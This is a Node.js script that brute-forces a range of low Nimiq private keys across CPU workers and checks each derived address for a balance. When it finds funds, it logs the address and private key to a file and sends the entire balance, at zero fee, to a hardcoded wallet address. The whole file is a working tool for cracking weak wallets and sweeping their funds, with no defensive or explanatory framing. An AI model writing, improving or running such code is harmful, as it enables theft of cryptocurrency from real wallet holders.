const cluster = require('cluster');
const fs = require('fs');
const HEIGHT_FILE = './block.txt';

(async () => {
  // args
  const argv = require('minimist')(process.argv.slice(2));
  const numCPUs = argv?.t || 2;
  const range = argv?.r || "1:1fffffffff";
  const addressToCheckBalance = argv?.b || null;

  // Connect
  const Connection = require('./connection');
  const connection = new Connection();
  const wrapper = await connection.connect();

  // Check balance
  if (addressToCheckBalance) {
    wrapper.accountHelper.getBalance(addressToCheckBalance, function(b) {
      const balance = b / 100000;
      console.log(`\n------ Balance Checker -------\n`);
      console.log(`\x1b[32m${addressToCheckBalance} : ${balance} NIM\x1b[0m`);
      console.log(`\n------ Balance Checker -------\n`);
      process.exit(0);
    })

    return;
  }

  // Main
  if (cluster.isMaster) {
    const [rangeStart = "1", rangeEnd = "1fffffffff"] = range.split(":");
    const start = "0".repeat(64 - rangeStart.length) + rangeStart
    const end = rangeEnd + "0".repeat(64 - rangeEnd.length)

    if (!fs.existsSync(HEIGHT_FILE)) {
      fs.writeFileSync(HEIGHT_FILE, start);
    }

    const height = fs.readFileSync(HEIGHT_FILE).toString().trim() || start;

    for (let i = 0; i < numCPUs; i++) {
      cluster.fork({ START_KEY: `0x${height}`, END_KEY: `0x${end}` });
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    const send = (privateKeyHex) => new Promise((resolve) => {
      const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
      const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
      wrapper.accountHelper.getBalance(address, (amount) => {
        const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount, fee: 0 }
        wrapper.transactionHelper.sendTransaction(wallet, payload)
        resolve(address)
      })
    })

    const getBalance = async (address) => new Promise((resolve) => {
      try {
        wrapper.accountHelper.getBalance(address, (b) => {
          const balance = b / 100000;
          resolve(balance);
        });
      } catch (error) {
        resolve(-1);
      }
    });

    const START_KEY = BigInt(process.env.START_KEY);
    const END_KEY = BigInt(process.env.END_KEY);
    const WORKER_INDEX = cluster.worker.id;

    let founds = 0;
    let start = START_KEY + (BigInt(WORKER_INDEX - 1));

    for (let key = start; key <= END_KEY; key = key + BigInt(numCPUs)) {
      const privateKeyHex = key.toString(16).padStart(64, '0');
      const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
      const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
      const balance = await getBalance(address);

      if (balance > 0) {
        founds++;
        console.info(`\x1b[32mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);

        // Write to file
        var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));

        // Create transaction to main wallet
        await send(privateKeyHex);
      } else {
        console.info(`\x1b[35mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
      }

      fs.writeFileSync(HEIGHT_FILE, privateKeyHex);
    }
  }
})()

